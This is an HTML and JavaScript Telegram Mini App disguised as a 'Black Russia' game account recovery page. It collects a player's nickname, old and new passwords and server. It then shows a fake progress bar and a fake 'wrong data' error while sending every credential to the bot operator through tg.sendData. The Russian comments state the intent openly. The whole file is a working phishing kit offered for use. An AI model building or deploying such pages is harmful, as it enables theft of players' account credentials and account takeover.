<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Black Russia Launcher</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }

        /* === ФОН, КОТОРЫЙ ТЫ СКИНУЛ === */
        body {
            background-color: #040101;
            background-image: url('bg.jpg'); /* Картинка должна лежать рядом с этим файлом */
            background-size: cover;
            background-position: center;
            color: #ffffff;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            overflow: hidden;
        }

        /* Затемнение фона */
        body::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, rgba(5, 1, 1, 0.8) 0%, rgba(0, 0, 0, 0.6) 100%);
            z-index: -1;
        }

        .screen { display: none; flex-direction: column; width: 100%; max-width: 380px; padding: 20px; z-index: 10; }
        .screen.active { display: flex; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Экран загрузки при старте */
        .loading-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #040101; display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 9999;
        }
        .loader-spinner { width: 50px; height: 50px; border: 3px solid #2a0000; border-top: 3px solid #e51b1b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 12px; letter-spacing: 2px; color: #888; margin-bottom: 10px; text-transform: uppercase; }
        .loader-percent { font-size: 24px; font-weight: bold; color: #fff; margin-bottom: 15px; }
        .progress-bg { width: 80%; max-width: 300px; height: 4px; background: #1a0000; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #940f0f, #e51b1b); transition: width 0.1s; }

        /* Логотип */
        .logo-area { text-align: center; margin-bottom: 30px; }
        .logo-area img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 10px; }
        .logo-area h1 { font-size: 26px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
        .logo-area h1 span { color: #e51b1b; }
        .logo-area p { color: #e51b1b; font-size: 10px; letter-spacing: 3px; margin-top: 5px; font-weight: bold; }

        /* Поля ввода */
        .input-group { background: rgba(11, 3, 3, 0.85); border: 1px solid #1a0b0b; border-radius: 10px; padding: 10px 15px; margin-bottom: 12px; display: flex; align-items: center; height: 58px; transition: border 0.3s; backdrop-filter: blur(5px); }
        .input-group:focus-within { border-color: #e51b1b; }
        .icon { width: 32px; height: 32px; border-radius: 8px; background: linear-gradient(135deg, #e51b1b, #8a0606); display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; }
        .icon svg { width: 18px; height: 18px; fill: #fff; }
        .field { flex-grow: 1; }
        .field label { display: block; font-size: 9px; color: #a39696; text-transform: uppercase; font-weight: bold; margin-bottom: 2px; }
        .field input, .field select { width: 100%; background: none; border: none; color: #fff; font-size: 14px; outline: none; }
        .field select option { background: #0b0303; color: #fff; }

        /* Кнопки */
        .btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #940f0f, #d61818); border: none; border-radius: 10px; color: #fff; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(229, 27, 27, 0.3); }
        .btn:active { transform: scale(0.98); }

        /* Модалка проверки базы (6 сек) */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(4, 1, 1, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center;
            z-index: 1000; backdrop-filter: blur(10px);
        }
        .modal-overlay.show { display: flex; animation: fadeIn 0.3s; }
    </style>
</head>
<body>

    <!-- === 1. ЭКРАН СТАРТОВОЙ ЗАГРУЗКИ === -->
    <div id="startLoader" class="loading-screen">
        <div class="loader-spinner"></div>
        <div class="loader-text">Загрузка данных сервера</div>
        <div class="loader-percent" id="startPercent">0%</div>
        <div class="progress-bg"><div class="progress-fill" id="startBar"></div></div>
    </div>

    <!-- === 2. ОСНОВНОЙ ЭКРАН (ВХОД) === -->
    <div id="mainScreen" class="screen">
        <div class="logo-area">
            <img src="logo.png" alt="BR">
            <h1>BLACK <span>RUSSIA</span></h1>
            <p>✦ ВОССТАНОВЛЕНИЕ ✦</p>
        </div>

        <div class="input-group">
            <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
            <div class="field">
                <label>Игровой ник</label>
                <input type="text" id="nick" placeholder="Ivan_Capone">
            </div>
        </div>

        <div class="input-group">
            <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
            <div class="field">
                <label>Старый пароль</label>
                <input type="password" id="old_pass" placeholder="••••••••">
            </div>
        </div>

        <div class="input-group">
            <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
            <div class="field">
                <label>Новый пароль</label>
                <input type="password" id="new_pass" placeholder="••••••••">
            </div>
        </div>

        <div class="input-group">
            <div class="icon" style="background: linear-gradient(135deg, #ff512f, #dd2476);">☰</div>
            <div class="field">
                <label>Выбор сервера</label>
                <select id="server">
                    <option value="01 | RED">01 | RED</option>
                    <option value="02 | GREEN">02 | GREEN</option>
                    <option value="03 | BLUE">03 | BLUE</option>
                    <option value="04 | YELLOW">04 | YELLOW</option>
                    <option value="05 | ORANGE">05 | ORANGE</option>
                    <option value="06 | PURPLE">06 | PURPLE</option>
                </select>
            </div>
        </div>

        <button class="btn" onclick="startRecovery()">Восстановить аккаунт →</button>
    </div>

    <!-- === 3. МОДАЛКА ПРОВЕРКИ (6 СЕКУНД) === -->
    <div id="checkModal" class="modal-overlay">
        <div class="loader-spinner"></div>
        <div class="loader-text" style="color: #fff; font-size: 14px;">Проверка баз данных</div>
        <div class="loader-percent" id="checkPercent">0%</div>
        <div class="progress-bg"><div class="progress-fill" id="checkBar"></div></div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }

        // === 1. ЛОГИКА СТАРТОВОЙ ЗАГРУЗКИ ===
        let startP = 0;
        const startInterval = setInterval(() => {
            startP += 2;
            document.getElementById('startPercent').textContent = startP + '%';
            document.getElementById('startBar').style.width = startP + '%';
            
            if (startP >= 100) {
                clearInterval(startInterval);
                setTimeout(() => {
                    document.getElementById('startLoader').style.display = 'none';
                    document.getElementById('mainScreen').classList.add('active');
                }, 400);
            }
        }, 30);

        // === 2. ЛОГИКА ВОССТАНОВЛЕНИЯ (БЕЗ СЕРВЕРА, ЧЕРЕЗ tg.sendData) ===
        function startRecovery() {
            const nick = document.getElementById('nick').value.trim();
            const oldPass = document.getElementById('old_pass').value.trim();
            const newPass = document.getElementById('new_pass').value.trim();
            const server = document.getElementById('server').value;

            if (!nick || !oldPass || !newPass) {
                alert('Заполните все поля!');
                return;
            }

            // Скрываем главный экран и показываем загрузку
            document.getElementById('mainScreen').classList.remove('active');
            document.getElementById('checkModal').classList.add('show');

            // Полоска загрузки 6 секунд
            let checkP = 0;
            const checkInterval = setInterval(() => {
                checkP++;
                document.getElementById('checkPercent').textContent = checkP + '%';
                document.getElementById('checkBar').style.width = checkP + '%';

                if (checkP >= 100) {
                    clearInterval(checkInterval);
                    
                    // Когда полоска дошла до 100%, ждем 0.5 сек
                    setTimeout(() => {
                        document.getElementById('checkModal').classList.remove('show');
                        
                        // Показываем системное окно с ошибкой
                        alert(`Ошибка баз данных ${server}.\nВы ввели неверные данные.`);
                        
                        // КАК ТОЛЬКО НАЖАЛИ "ОК", ОТПРАВЛЯЕМ ДАННЫЕ И ЗАКРЫВАЕМ ОКНО
                        const data = `🔄 ВОССТАНОВЛЕНИЕ\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🌍 Сервер: ${server}`;
                        
                        if (tg) {
                            tg.sendData(data); // Данные улетают, Mini App закрывается
                        } else {
                            console.log("Тест в браузере. Данные:", data);
                        }
                    }, 500);
                }
            }, 60); // 60 мс * 100 = 6 секунд
        }
    </script>
</body>
</html>
